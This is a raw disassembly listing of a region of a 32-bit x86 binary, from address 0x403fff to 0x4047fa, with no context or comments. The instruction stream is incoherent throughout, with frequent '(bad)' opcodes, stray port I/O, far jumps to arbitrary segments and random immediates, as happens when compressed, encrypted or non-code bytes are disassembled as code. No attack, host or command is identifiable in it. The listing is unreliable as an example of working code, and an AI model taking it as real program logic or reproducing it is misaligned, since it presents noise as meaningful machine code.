  403fff:	and    DWORD PTR [eax+0x16],ebp
  404002:	out    dx,eax
  404003:	mov    eax,ds:0xa3f6647a
  404008:	xchg   ebp,eax
  404009:	jge    0x404078
  40400b:	jecxz  0x404021
  40400d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40400e:	mov    eax,ds:0x923645c0
  404013:	xor    al,0xa7
  404015:	push   edx
  404016:	(bad)  
  404017:	sbb    eax,0xa6c6331d
  40401c:	dec    esp
  40401d:	out    dx,eax
  40401e:	mov    ah,0x2f
  404020:	fidivr DWORD PTR [ebp-0x7a4b9059]
  404026:	in     al,dx
  404027:	add    ah,BYTE PTR [esi]
  404029:	fs out dx,al
  40402b:	addr16 push edi
  40402d:	dec    eax
  40402e:	loop   0x40406f
  404030:	inc    edx
  404031:	popf   
  404032:	out    dx,eax
  404033:	and    edi,edi
  404035:	mov    ch,0xea
  404037:	clc    
  404038:	xchg   ecx,eax
  404039:	sbb    al,cl
  40403b:	mov    dh,0x2e
  40403d:	dec    ebp
  40403e:	into   
  40403f:	cmp    BYTE PTR [edi-0x11],0x80
  404043:	hlt    
  404044:	(bad)  
  404045:	(bad)  
  404046:	das    
  404047:	adc    DWORD PTR [eax-0x6bdcf51a],eax
  40404d:	push   0x5d
  40404f:	(bad)  
  404050:	in     al,0x14
  404052:	inc    ebp
  404053:	es xor eax,0xc97eea2d
  404059:	jmp    0x78b510b3
  40405e:	xor    edi,DWORD PTR [edx-0x5c]
  404061:	add    DWORD PTR [edx+0x68],edi
  404064:	add    eax,0xa82a5808
  404069:	outs   dx,BYTE PTR ds:[esi]
  40406a:	jae    0x404092
  40406c:	fldenv [eax+0x71]
  40406f:	and    eax,0xb3e64447
  404074:	jmp    0x3816:0x6bed2420
  40407b:	push   0x7b
  40407d:	mov    edx,edi
  40407f:	(bad)  
  404081:	push   eax
  404082:	cmp    cl,al
  404084:	stc    
  404085:	cwde   
  404086:	mov    edx,esp
  404088:	repnz scas eax,DWORD PTR es:[edi]
  40408a:	sar    BYTE PTR [edi+0x4381b3a0],0xe5
  404091:	gs popa 
  404093:	and    BYTE PTR [edx],cl
  404095:	pop    ecx
  404096:	enter  0x3212,0xb8
  40409a:	(bad)  
  40409b:	jmp    0x73176b4d
  4040a0:	sub    ch,BYTE PTR [ecx+0x10e596f6]
  4040a6:	pushf  
  4040a7:	int    0x74
  4040a9:	lahf   
  4040aa:	mov    bh,0x3c
  4040ac:	dec    edi
  4040ad:	pop    ss
  4040ae:	xor    BYTE PTR [edi+0x520010f9],bh
  4040b4:	leave  
  4040b5:	sahf   
  4040b6:	inc    ecx
  4040b7:	int    0x1
  4040b9:	not    al
  4040bb:	mov    al,ds:0x31b1f76d
  4040c0:	pop    esi
  4040c1:	loop   0x4040ee
  4040c3:	mov    ecx,?
  4040c5:	pop    es
  4040c6:	push   edx
  4040c7:	call   0xf8036818
  4040cc:	xchg   bl,dl
  4040ce:	fs test eax,0xf4ed6f9f
  4040d4:	call   0x9dbc3b97
  4040d9:	xor    eax,0xdb5ec0a5
  4040de:	or     al,0xa9
  4040e0:	pop    es
  4040e1:	(bad)  
  4040e2:	(bad)  [edi+edi*4-0x7d]
  4040e6:	xor    BYTE PTR [edi+edi*4+0xa0b30c9],bl
  4040ed:	mov    bh,BYTE PTR [edx-0xf9c388a]
  4040f3:	push   ebx
  4040f4:	enter  0xe06,0xcb
  4040f8:	jmp    0x5a0:0xdd97aa33
  4040ff:	imul   ecx,edi,0xffffffdd
  404102:	adc    DWORD PTR [eax-0x7a],edi
  404105:	fcmovnb st,st(1)
  404107:	std    
  404108:	xor    eax,0x37116c4e
  40410d:	cmp    cl,BYTE PTR [esi]
  40410f:	les    eax,FWORD PTR [ecx+0x4e]
  404112:	jmp    FWORD PTR [edx-0x21]
  404115:	inc    ecx
  404116:	repz (bad) 
  404118:	jle    0x40418e
  40411a:	push   ebx
  40411b:	stos   BYTE PTR es:[edi],al
  40411c:	mul    esp
  40411e:	pushf  
  40411f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404120:	hlt    
  404121:	les    esi,FWORD PTR [edx-0x76be6627]
  404127:	inc    eax
  404128:	push   edi
  404129:	fild   DWORD PTR [edx+0x30]
  40412c:	bound  ecx,QWORD PTR [esi]
  40412e:	mov    eax,0xf697016a
  404133:	clc    
  404134:	mov    al,0x47
  404136:	pop    ebp
  404137:	outs   dx,BYTE PTR ds:[esi]
  404138:	dec    eax
  404139:	imul   ebx,DWORD PTR [edi],0xffffffc0
  40413c:	pop    esi
  40413d:	in     al,dx
  40413e:	add    ecx,ecx
  404140:	or     al,BYTE PTR [ecx*1+0x49116166]
  404147:	jle    0x4040d0
  404149:	pop    ecx
  40414a:	fnstcw WORD PTR [edx+0x6c95e64]
  404150:	inc    esp
  404151:	pop    es
  404152:	dec    eax
  404153:	cmc    
  404154:	icebp  
  404155:	xchg   esp,eax
  404156:	lods   al,BYTE PTR ds:[esi]
  404157:	les    edx,FWORD PTR ds:0x69f3cf6
  40415d:	jg     0x404119
  40415f:	dec    eax
  404160:	out    dx,al
  404161:	push   ss
  404162:	fmul   st,st(5)
  404164:	xor    al,0xd1
  404166:	scas   al,BYTE PTR es:[edi]
  404167:	adc    DWORD PTR [edi+eiz*2],esp
  40416a:	pop    ecx
  40416b:	(bad)  
  40416c:	sub    eax,0x7223b8d0
  404171:	jns    0x4041ac
  404173:	or     eax,0xd5dfb3af
  404178:	icebp  
  404179:	mov    ebx,0x2a11ba56
  40417e:	outs   dx,BYTE PTR ds:[esi]
  40417f:	cs jle 0x4041fd
  404182:	test   BYTE PTR [ecx+0xd],bh
  404185:	mov    ds:0xdc1312f1,eax
  40418a:	pop    es
  40418b:	dec    edi
  40418c:	pop    ebx
  40418d:	jo     0x40412b
  40418f:	jbe    0x404131
  404191:	repnz or eax,0x789081cf
  404197:	cmp    al,0xa3
  404199:	ins    BYTE PTR es:[edi],dx
  40419a:	adc    DWORD PTR [esi],0x73
  40419d:	inc    ebx
  40419e:	in     eax,dx
  40419f:	cs sbb dl,cl
  4041a2:	addr16 addr16 pop ss
  4041a5:	in     al,0xf1
  4041a7:	int3   
  4041a8:	or     edx,edi
  4041aa:	and    DWORD PTR [esp+ecx*4-0x69],edi
  4041ae:	push   ebp
  4041af:	cmp    al,BYTE PTR [ecx]
  4041b1:	lahf   
  4041b2:	hlt    
  4041b3:	push   esp
  4041b4:	jle    0x404140
  4041b6:	loopne 0x4041fd
  4041b8:	sbb    DWORD PTR ds:0xd9c178d4,0x53
  4041bf:	adc    esi,ebx
  4041c1:	ins    DWORD PTR es:[edi],dx
  4041c2:	popf   
  4041c3:	cmp    BYTE PTR [ebp+0x38],dl
  4041c6:	push   0x17875614
  4041cb:	out    dx,eax
  4041cc:	ins    BYTE PTR es:[edi],dx
  4041cd:	lods   al,BYTE PTR ds:[esi]
  4041ce:	ds push ebx
  4041d0:	xchg   ebp,eax
  4041d1:	xchg   ecx,eax
  4041d2:	mov    cl,0x73
  4041d4:	inc    esp
  4041d5:	ds jecxz 0x4041be
  4041d8:	sub    esp,edi
  4041da:	and    BYTE PTR [edx+ecx*2+0x7c5ce30d],bl
  4041e1:	jp     0x4041c6
  4041e3:	push   edx
  4041e4:	shl    BYTE PTR [esi],cl
  4041e6:	inc    ebx
  4041e7:	(bad)  
  4041e8:	sti    
  4041e9:	mov    esp,0x7a87348b
  4041ee:	test   al,0x32
  4041f0:	xchg   esi,eax
  4041f1:	loopne 0x4041cb
  4041f3:	inc    ebp
  4041f4:	ss cwde 
  4041f6:	add    BYTE PTR [edi+0x5250c4c9],bh
  4041fc:	scas   eax,DWORD PTR es:[edi]
  4041fd:	ror    BYTE PTR ds:0x87c6989d,1
  404203:	cmp    al,0x2f
  404205:	mov    al,0xbe
  404207:	push   ebp
  404208:	cmc    
  404209:	ins    BYTE PTR es:[edi],dx
  40420a:	int    0x91
  40420c:	push   esp
  40420d:	mov    ah,0x4c
  40420f:	fwait
  404210:	cmp    DWORD PTR [ebp+0x3b],ebx
  404213:	xchg   ecx,eax
  404214:	mov    BYTE PTR [esp+ebx*8+0x45],ah
  404218:	mov    al,ds:0xc28d0afd
  40421d:	dec    edi
  40421e:	lahf   
  40421f:	sahf   
  404220:	mov    DWORD PTR [ebx+esi*4],esp
  404223:	mov    eax,0xd7c15cf2
  404228:	mov    ecx,eax
  40422a:	dec    ebp
  40422b:	fucom  st(3)
  40422d:	mov    al,ds:0xc820a659
  404232:	(bad)  
  404233:	out    dx,al
  404234:	jmp    0xe3b8:0xedbaff2c
  40423b:	inc    eax
  40423c:	aad    0xe6
  40423e:	pop    ebx
  40423f:	add    al,0x39
  404241:	sbb    al,0xf1
  404243:	mov    al,BYTE PTR [ecx-0x24]
  404246:	mov    bl,0x12
  404248:	push   ebp
  404249:	jecxz  0x4041dc
  40424b:	inc    ebp
  40424c:	fisubr DWORD PTR [esi]
  40424e:	jg     0x4041e7
  404250:	loope  0x4042aa
  404252:	push   ds
  404253:	xchg   edi,eax
  404254:	fwait
  404255:	es idiv cl
  404258:	xchg   ebx,eax
  404259:	pusha  
  40425a:	(bad)  [ecx-0x7b]
  40425d:	xchg   ecx,eax
  40425e:	outs   dx,DWORD PTR ds:[esi]
  40425f:	jmp    0x40428f
  404261:	push   esi
  404262:	mov    ecx,0x60a559fd
  404267:	pop    ds
  404268:	jge    0x404241
  40426a:	lods   al,BYTE PTR ds:[esi]
  40426b:	sub    BYTE PTR [edi-0x63],0x49
  40426f:	push   edi
  404270:	inc    edx
  404271:	lahf   
  404272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404273:	jmp    0x6187a96
  404278:	(bad)  
  404279:	sbb    bh,ch
  40427b:	inc    ebp
  40427c:	shl    BYTE PTR [esi-0x577607be],cl
  404282:	les    ebp,FWORD PTR [ecx]
  404284:	push   ds
  404285:	es (bad) 
  404287:	out    dx,eax
  404288:	lea    edx,[eax-0x13dd5b7b]
  40428e:	out    0x94,al
  404290:	ins    BYTE PTR es:[edi],dx
  404291:	(bad)  
  404292:	pop    ebp
  404293:	mov    WORD PTR [edx+esi*2-0x256e6cb0],?
  40429a:	dec    ebp
  40429b:	jbe    0x404278
  40429d:	xchg   edx,eax
  40429e:	pop    esp
  40429f:	test   DWORD PTR [ebp-0x5fcb995],0xf546be23
  4042a9:	mov    edi,0x7e2243d
  4042ae:	or     edx,DWORD PTR [ecx+0x6d1cf673]
  4042b4:	scas   eax,DWORD PTR es:[edi]
  4042b5:	and    DWORD PTR [ecx],ebp
  4042b7:	cli    
  4042b8:	and    dh,BYTE PTR [eax+0x59ec8460]
  4042be:	push   cs
  4042bf:	inc    edx
  4042c0:	xchg   edi,eax
  4042c1:	fisubr DWORD PTR [esi]
  4042c3:	mov    esp,0x88d0155c
  4042c8:	retf   
  4042c9:	pop    ecx
  4042ca:	add    edx,DWORD PTR ds:0x99e2dcd6
  4042d0:	ror    BYTE PTR [eax+ecx*2],0x67
  4042d4:	mov    ?,WORD PTR [edi-0x636ce691]
  4042da:	shl    DWORD PTR [eiz*1-0x58f6e6aa],cl
  4042e1:	shr    BYTE PTR [esi+0x7],1
  4042e4:	paddd  mm3,QWORD PTR [ebx-0x578fb634]
  4042eb:	inc    eax
  4042ec:	iret   
  4042ed:	lods   eax,DWORD PTR ds:[esi]
  4042ee:	(bad)  
  4042ef:	jbe    0x404290
  4042f1:	sub    al,0x11
  4042f3:	inc    ebp
  4042f4:	jecxz  0x40431c
  4042f6:	dec    edx
  4042f7:	or     dh,BYTE PTR [eax]
  4042f9:	in     eax,0x69
  4042fb:	mov    ch,BYTE PTR [esi]
  4042fd:	cmp    DWORD PTR [ebx],edx
  4042ff:	ins    DWORD PTR es:[edi],dx
  404300:	xlat   BYTE PTR ds:[ebx]
  404301:	push   edx
  404302:	mov    ecx,0x8452a58
  404307:	pop    ebx
  404308:	sbb    ebp,DWORD PTR [esi]
  40430a:	mov    dh,0x81
  40430c:	call   0x17b6475c
  404311:	sub    BYTE PTR [ebx+0x37],cl
  404314:	stos   DWORD PTR es:[edi],eax
  404315:	and    DWORD PTR [edx+eiz*1-0x56],esi
  404319:	xor    al,0x8d
  40431b:	shr    DWORD PTR [ecx+0x4056bb96],0xce
  404322:	mov    eax,ds:0x356e45cc
  404327:	hlt    
  404328:	aam    0xc4
  40432a:	and    DWORD PTR [ebx],esp
  40432c:	dec    ecx
  40432d:	stos   DWORD PTR es:[edi],eax
  40432e:	push   eax
  40432f:	call   0xccfd:0xa0f3c887
  404336:	mov    dh,0x73
  404338:	(bad)  
  404339:	mov    esp,0xffbf27ba
  40433e:	push   cs
  40433f:	xchg   DWORD PTR [ebx*4-0x65cd7c3d],esp
  404346:	rcr    BYTE PTR [edx*8+0x5711ce86],1
  40434d:	mov    al,ds:0x526259fa
  404352:	sub    BYTE PTR [esi-0x2a],0xd2
  404356:	enter  0x9fef,0x51
  40435a:	fcomi  st,st(2)
  40435c:	pop    edx
  40435d:	cmp    eax,0x8ddcce5d
  404362:	or     al,0x5e
  404364:	les    edi,FWORD PTR [edi-0x60]
  404367:	jmp    0x629f3f09
  40436c:	push   ebx
  40436d:	add    DWORD PTR [ecx-0x6af91f78],ebp
  404373:	outs   dx,DWORD PTR ds:[esi]
  404374:	inc    di
  404376:	pushf  
  404377:	ret    
  404378:	aas    
  404379:	mov    ah,0xc
  40437b:	(bad)  
  40437c:	push   ds
  40437d:	and    al,0x42
  40437f:	aas    
  404380:	nop
  404381:	and    DWORD PTR [ecx],ebp
  404383:	inc    ebp
  404384:	idiv   BYTE PTR [esi*2+0x5c80dbe0]
  40438b:	and    bh,BYTE PTR ds:[ecx-0x2badaf42]
  404392:	jl     0x404341
  404394:	push   eax
  404395:	cmp    eax,0x4440cab5
  40439a:	inc    esp
  40439b:	outs   dx,BYTE PTR ds:[esi]
  40439c:	cmp    al,0xf8
  40439e:	lds    eax,FWORD PTR [eax+ecx*4+0x38113b41]
  4043a5:	xor    al,0xca
  4043a7:	shl    BYTE PTR [edx-0x784f4e6a],1
  4043ad:	inc    edi
  4043ae:	sub    ah,BYTE PTR [eax-0x2a]
  4043b1:	cmp    eax,0x42623a8f
  4043b6:	add    eax,0xce605ce0
  4043bb:	jmp    0x404387
  4043bd:	sub    DWORD PTR [eax+0x7c185196],edi
  4043c3:	push   0xcd344454
  4043c8:	rcl    BYTE PTR [edi+0x3520de39],0xdd
  4043cf:	xchg   esi,eax
  4043d0:	sbb    BYTE PTR [esi-0x6e3d1987],ah
  4043d6:	ds pop ss
  4043d8:	inc    edx
  4043d9:	fnstsw WORD PTR [esi+0x26ee9ba4]
  4043df:	adc    eax,0x1b19fcd6
  4043e4:	fcmovnu st,st(6)
  4043e6:	inc    ecx
  4043e7:	les    edx,FWORD PTR [ebx+0x74]
  4043ea:	retf   
  4043eb:	enter  0x853e,0x4e
  4043ef:	or     al,0xe4
  4043f1:	int    0x32
  4043f3:	add    edx,esi
  4043f5:	cmp    al,0xf1
  4043f7:	sbb    ebx,DWORD PTR [ecx+0x4]
  4043fa:	sbb    edx,DWORD PTR [eax+0x4a237f7f]
  404400:	inc    eax
  404401:	inc    edx
  404402:	idiv   ch
  404404:	out    dx,eax
  404405:	mov    esp,0x4e81a08b
  40440b:	or     DWORD PTR [esi+edx*4-0x4f370762],esp
  404412:	jno    0x4043d1
  404414:	gs inc edx
  404416:	enter  0xdb9f,0x2b
  40441a:	ficom  WORD PTR [eax]
  40441c:	push   ss
  40441d:	jecxz  0x404478
  40441f:	das    
  404420:	cdq    
  404421:	cmp    eax,0xbdc1ed2f
  404426:	dec    ecx
  404427:	jmp    0xa560a269
  40442c:	mov    ch,0xf6
  40442e:	neg    BYTE PTR [edx+0xb502812]
  404434:	push   cs
  404435:	rol    DWORD PTR [eax-0x76],0xd2
  404439:	jl     0x4043e1
  40443b:	cmp    BYTE PTR [eax],dl
  40443d:	fdivr  DWORD PTR [eax-0x98d2d43]
  404443:	push   ebp
  404444:	clc    
  404445:	aad    0x4a
  404447:	js     0x404459
  404449:	dec    edi
  40444a:	mov    ecx,eax
  40444c:	lods   eax,DWORD PTR ds:[esi]
  40444d:	xchg   edx,eax
  40444e:	addr16 mov ds:0x8fde,eax
  404452:	in     eax,0x26
  404454:	xchg   edx,eax
  404455:	mov    cl,0x39
  404457:	mov    al,0xad
  404459:	shl    BYTE PTR [edx+0x35a5a116],1
  40445f:	ret    
  404460:	xchg   ebx,eax
  404461:	daa    
  404462:	sub    esp,DWORD PTR [esi]
  404464:	dec    esi
  404465:	jbe    0x404481
  404467:	add    eax,0x9e10c4f9
  40446c:	jbe    0x40444f
  40446e:	push   0xffffffcc
  404470:	sbb    eax,0xcc47eab3
  404475:	lea    eax,[edx]
  404477:	jns    0x40447d
  404479:	mov    bh,0x44
  40447b:	adc    ch,BYTE PTR [ebx-0x737405c1]
  404481:	pop    esp
  404482:	daa    
  404483:	xor    edx,DWORD PTR [ebx-0x1f]
  404486:	es das 
  404488:	ror    ch,1
  40448a:	and    al,0xa8
  40448c:	dec    esp
  40448d:	xchg   esp,eax
  40448e:	push   es
  40448f:	or     dh,bl
  404491:	xchg   DWORD PTR [eax+0x5133f51c],ecx
  404497:	mov    DWORD PTR [esi],esi
  404499:	inc    ecx
  40449a:	scas   eax,DWORD PTR es:[edi]
  40449b:	jmp    0xfcd7:0x946d8482
  4044a2:	popf   
  4044a3:	stos   DWORD PTR es:[edi],eax
  4044a4:	push   ds
  4044a5:	stos   DWORD PTR es:[edi],eax
  4044a6:	dec    ecx
  4044a7:	stos   DWORD PTR es:[edi],eax
  4044a8:	add    eax,0x58755685
  4044ad:	or     bh,BYTE PTR [eax+0x53e9abee]
  4044b3:	ret    0x62f1
  4044b6:	mov    dh,0xf0
  4044b8:	imul   ebx,DWORD PTR [edi],0x4c
  4044bb:	push   esp
  4044bc:	retf   0xe167
  4044bf:	xchg   ebp,eax
  4044c0:	into   
  4044c1:	mov    edx,0x5c64d94b
  4044c6:	jns    0x404461
  4044c8:	(bad)  
  4044c9:	call   DWORD PTR [esi-0x1a]
  4044cc:	mov    bh,0x1f
  4044ce:	outs   dx,BYTE PTR ds:[esi]
  4044cf:	mov    edi,0x19e5a4da
  4044d4:	loop   0x404546
  4044d6:	les    edx,FWORD PTR ds:0x450fe1fa
  4044dc:	imul   edx,DWORD PTR [edx+0x94b1f09],0x5f014818
  4044e6:	in     al,dx
  4044e7:	jae    0x404560
  4044e9:	push   ss
  4044ea:	retf   0xb1cc
  4044ed:	push   es
  4044ee:	and    bl,BYTE PTR [ecx+0x45]
  4044f1:	inc    esp
  4044f2:	dec    esp
  4044f3:	inc    eax
  4044f4:	mov    dh,0x25
  4044f6:	inc    ebx
  4044f7:	les    ebp,FWORD PTR [esi-0x3a]
  4044fa:	fidivr DWORD PTR [edi-0x62]
  4044fd:	es dec ebp
  4044ff:	and    al,BYTE PTR [eax+0x3d7ce8de]
  404505:	addr16 xor al,0x81
  404508:	test   BYTE PTR [ebx-0x701dc111],0xfc
  40450f:	je     0x40456a
  404511:	daa    
  404512:	xrelease mov BYTE PTR ds:0xff0128ee,ch
  404519:	test   al,0x1b
  40451b:	add    DWORD PTR [edi],0xcb93f72c
  404521:	enter  0x4922,0x9d
  404525:	dec    ebp
  404526:	(bad)  
  404527:	push   esi
  404528:	dec    ecx
  404529:	inc    ebp
  40452a:	add    al,0x78
  40452c:	inc    eax
  40452d:	dec    esp
  40452e:	sub    eax,0x4d7f249b
  404533:	loopne 0x4044dd
  404535:	cmp    eax,0x820eb916
  40453a:	ds add eax,0x4c7683fa
  404540:	fs xchg ecx,eax
  404542:	xchg   ecx,eax
  404543:	sbb    ebp,DWORD PTR [edi-0x71f43c01]
  404549:	push   esi
  40454a:	mov    bh,0xee
  40454c:	out    0x94,al
  40454e:	sbb    al,0x7c
  404550:	jno    0x4045c6
  404552:	in     al,dx
  404553:	push   ss
  404554:	in     al,dx
  404555:	mov    esi,0xf4eaafb9
  40455a:	jns    0x40458a
  40455c:	push   eax
  40455d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455e:	stc    
  40455f:	lods   eax,DWORD PTR ds:[esi]
  404560:	hlt    
  404561:	pop    ecx
  404562:	pop    eax
  404563:	mov    ecx,0xfe168a1b
  404568:	mov    ds:0xa25e47ab,eax
  40456d:	inc    ecx
  40456e:	je     0x40455d
  404570:	mov    ecx,0x3ea16801
  404575:	jecxz  0x40457b
  404577:	sbb    ecx,ebx
  404579:	inc    eax
  40457a:	mov    esp,0x1e4bd71f
  40457f:	inc    esp
  404580:	xchg   edx,eax
  404581:	fwait
  404582:	cmc    
  404583:	mov    bh,BYTE PTR [ecx+edx*4]
  404586:	es (bad) 
  404588:	fldenv [edx]
  40458a:	sar    BYTE PTR [ecx],0xba
  40458d:	out    0xa4,eax
  40458f:	push   ebp
  404590:	mov    esp,0x5ce8b03d
  404595:	shr    DWORD PTR [edx+0x4010da5e],cl
  40459b:	push   esi
  40459c:	bound  esi,QWORD PTR [edi+0x68]
  40459f:	pop    edx
  4045a0:	dec    esi
  4045a1:	and    eax,0x2432e6c1
  4045a6:	pop    es
  4045a7:	outs   dx,DWORD PTR ds:[esi]
  4045a8:	mov    ds:0xd63ad662,eax
  4045ad:	enter  0xb861,0x64
  4045b1:	fs hlt 
  4045b3:	push   eax
  4045b4:	cmp    al,0xfb
  4045b6:	adc    esp,ebx
  4045b8:	iret   
  4045b9:	lahf   
  4045ba:	(bad)  
  4045bb:	adc    esi,edi
  4045bd:	jmp    0x26ab4a73
  4045c2:	cmp    esp,DWORD PTR [esi-0x2ad79c57]
  4045c8:	stos   BYTE PTR es:[edi],al
  4045c9:	xchg   DWORD PTR ds:0x29f649bc,esi
  4045cf:	inc    ecx
  4045d0:	xchg   BYTE PTR [eax-0x58],bl
  4045d3:	jmp    0xdde03f8f
  4045d8:	push   eax
  4045d9:	outs   dx,DWORD PTR ds:[esi]
  4045da:	jl     0x404585
  4045dc:	out    0xc9,al
  4045de:	fld    DWORD PTR [edi-0x11]
  4045e1:	bound  edi,QWORD PTR [ebp-0xb]
  4045e4:	scas   eax,DWORD PTR es:[edi]
  4045e5:	mov    esi,0x7d0a00c3
  4045ea:	mov    edi,0x2f9dcc0d
  4045ef:	cld    
  4045f0:	test   BYTE PTR [edi-0x109d4b38],ch
  4045f6:	mov    dh,0xce
  4045f8:	mov    dl,0x2b
  4045fa:	mov    dh,0x7b
  4045fc:	jo     0x4045a8
  4045fe:	in     eax,dx
  4045ff:	jge    0x404650
  404601:	cs push 0xffffffd4
  404604:	test   DWORD PTR [ecx],ebp
  404606:	cmp    al,0x90
  404608:	and    al,0xb
  40460a:	sub    ch,dh
  40460c:	(bad)  
  40460d:	fld    TBYTE PTR ds:0xab5731db
  404613:	scas   eax,DWORD PTR es:[edi]
  404614:	mov    bl,0x2
  404616:	mov    ebx,0x265faa8f
  40461b:	leave  
  40461c:	and    ebp,DWORD PTR [edi-0x2ac0dd8e]
  404622:	add    BYTE PTR [esi-0x4c807c7f],dh
  404628:	(bad)  
  404629:	pop    eax
  40462a:	jmp    0x404611
  40462c:	and    al,0xb9
  40462e:	push   ecx
  40462f:	inc    edi
  404630:	js     0x404633
  404632:	xchg   ebx,eax
  404633:	jg     0x40464b
  404635:	scas   al,BYTE PTR es:[edi]
  404636:	and    al,0xec
  404638:	icebp  
  404639:	fnstsw WORD PTR [ecx-0x4f]
  40463c:	nop
  40463d:	or     eax,0xf3ccc30
  404642:	sub    ah,BYTE PTR [eax+0x74302a25]
  404648:	call   0xdd1df2a7
  40464d:	pop    eax
  40464e:	push   ds
  40464f:	loope  0x404617
  404651:	dec    ebp
  404652:	mov    edx,0x22d16705
  404657:	arpl   bp,sp
  404659:	jle    0x404647
  40465b:	out    0xd9,eax
  40465d:	xor    BYTE PTR [esi-0x65],0xe9
  404661:	push   ecx
  404662:	fdiv   QWORD PTR [ebp+esi*8-0x34be84e3]
  404669:	pusha  
  40466a:	ins    BYTE PTR es:[edi],dx
  40466b:	mov    ds:0x8c76978f,eax
  404670:	(bad)  
  404671:	fld    QWORD PTR [eax+0x22]
  404674:	imul   ebp,DWORD PTR [ebx+0x72],0x4aea007b
  40467b:	xchg   DWORD PTR [ebx+0x7c],eax
  40467e:	inc    edi
  40467f:	in     al,dx
  404680:	cmp    DWORD PTR [ecx],0x19cb1280
  404686:	cmp    al,BYTE PTR [ecx-0x16]
  404689:	rol    BYTE PTR [eax],0x56
  40468c:	ins    DWORD PTR es:[edi],dx
  40468d:	aam    0x9
  40468f:	iret   
  404690:	hlt    
  404691:	stos   DWORD PTR es:[edi],eax
  404692:	mov    al,ds:0x302fbe0d
  404697:	push   cs
  404698:	jmp    0x404632
  40469a:	jle    0x404663
  40469c:	cs xchg eax,edx
  40469f:	call   0x9872:0x42d81dcf
  4046a6:	mov    BYTE PTR [ebp-0x1],cl
  4046a9:	push   0xffffffbc
  4046ab:	bound  edi,QWORD PTR [eax]
  4046ad:	cmp    bh,BYTE PTR [ebp-0x748b8ede]
  4046b3:	mov    al,0x37
  4046b5:	call   0x9a3f:0x7a380a6f
  4046bc:	out    0x6,al
  4046be:	add    edi,esp
  4046c0:	or     bl,0xd6
  4046c3:	sub    eax,0xe016edd9
  4046c8:	addr16 sub edi,esp
  4046cb:	out    0x64,al
  4046cd:	or     al,0xfd
  4046cf:	inc    edx
  4046d0:	push   ds
  4046d1:	mov    ds:0xf84fa38a,al
  4046d6:	leave  
  4046d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d8:	rol    DWORD PTR [ebp-0x25],cl
  4046db:	stos   DWORD PTR es:[edi],eax
  4046dc:	sub    BYTE PTR [ebp+eax*1-0x29b0d181],0x67
  4046e4:	adc    esp,ebx
  4046e6:	(bad)  
  4046e7:	ds leave 
  4046e9:	aam    0x4c
  4046eb:	add    ebx,esp
  4046ed:	aad    0xc6
  4046ef:	xchg   esp,eax
  4046f0:	ja     0x404755
  4046f2:	sbb    DWORD PTR [ebp-0x3d33e3cc],ebx
  4046f8:	neg    BYTE PTR [edx+0x30a2647e]
  4046fe:	dec    edx
  4046ff:	add    DWORD PTR [eax-0x5c919c94],edx
  404705:	pop    ecx
  404706:	test   al,0xed
  404708:	xor    ebx,DWORD PTR [ebx]
  40470a:	sub    al,dl
  40470c:	cmp    dl,BYTE PTR [edi+ebp*8]
  40470f:	aam    0x7e
  404711:	sbb    dh,BYTE PTR [edx+0x13]
  404714:	inc    edx
  404715:	push   es
  404716:	cmp    dh,BYTE PTR [ebx-0x3c]
  404719:	add    BYTE PTR [ebx-0x3f],dl
  40471c:	cld    
  40471d:	xchg   ebp,eax
  40471e:	(bad)
  404722:	adc    dh,BYTE PTR [ecx+0x2d88cf55]
  404728:	shl    DWORD PTR [ebx+0x15],1
  40472b:	es fdivr st(0),st
  40472e:	ror    esi,0x4
  404731:	fdivr  QWORD PTR [eax]
  404733:	idiv   DWORD PTR [ebx-0x624548d6]
  404739:	adc    eax,0x7bc35f4f
  40473e:	jnp    0x40479a
  404740:	dec    edx
  404741:	lock push 0xffffff8e
  404744:	les    ebx,FWORD PTR [eax+0x3f]
  404747:	int3   
  404748:	(bad)  
  404749:	(bad)  
  40474a:	outs   dx,BYTE PTR ds:[esi]
  40474b:	pop    esp
  40474c:	push   eax
  40474d:	sub    al,0x3a
  40474f:	inc    edx
  404750:	popa   
  404751:	pop    ebp
  404752:	adc    al,0x16
  404754:	frstor [ebx+0x35d47c58]
  40475a:	cmp    ebp,DWORD PTR [ebp+0x7df58db7]
  404760:	popa   
  404761:	aas    
  404762:	pop    ds
  404763:	push   eax
  404764:	mov    eax,0xd1dc0938
  404769:	dec    ebx
  40476a:	adc    DWORD PTR [edx+edx*2+0x41],eax
  40476e:	loopne 0x4047d3
  404770:	and    eax,0x1ebe03f9
  404775:	or     BYTE PTR [ebx-0x6fb39d58],bh
  40477b:	loope  0x404704
  40477d:	sub    dh,BYTE PTR [esi]
  40477f:	or     BYTE PTR [edx+0x74cd1ef0],al
  404785:	pop    ebx
  404786:	jns    0x404763
  404788:	not    BYTE PTR [ecx]
  40478a:	pop    ss
  40478b:	(bad)  
  40478c:	and    al,0x91
  40478e:	xor    eax,0xfe364c75
  404793:	rcr    DWORD PTR fs:[ecx-0x73],0xe2
  404798:	mov    WORD PTR [ecx-0x69],?
  40479b:	mov    dh,0x87
  40479d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40479e:	or     BYTE PTR [ecx+0x50a84efd],cl
  4047a4:	push   esp
  4047a5:	fadd   DWORD PTR [edx+0x48e438]
  4047ab:	pop    ebp
  4047ac:	lock jmp 0x33b1:0x7bebc40
  4047b4:	out    0xf9,al
  4047b6:	mov    ch,0x4e
  4047b8:	(bad)  
  4047b9:	fwait
  4047ba:	jmp    0xdbb5410
  4047bf:	push   cs
  4047c0:	gs mov esp,0x2de4a628
  4047c6:	retf   0x7837
  4047c9:	pop    esp
  4047ca:	mov    ebx,0xe11471ef
  4047cf:	mov    al,0x5f
  4047d1:	xchg   edi,eax
  4047d2:	xor    esi,DWORD PTR [eax+ecx*8]
  4047d5:	push   ebx
  4047d6:	mov    ecx,0xe5b87592
  4047db:	jecxz  0x4047ef
  4047dd:	icebp  
  4047de:	sub    BYTE PTR [edi],dl
  4047e0:	call   DWORD PTR [ebp+0x4c]
  4047e3:	jmp    0x40482c
  4047e5:	lods   al,BYTE PTR ds:[esi]
  4047e6:	adc    eax,0xa0eaefbf
  4047eb:	ret    
  4047ec:	mov    dh,0x2e
  4047ee:	jg     0x4047e5
  4047f0:	mov    bl,0xe6
  4047f2:	and    BYTE PTR [eax],0x6f
  4047f5:	adc    eax,0x6c6ab13e
  4047fa:	xchg   edx,eax
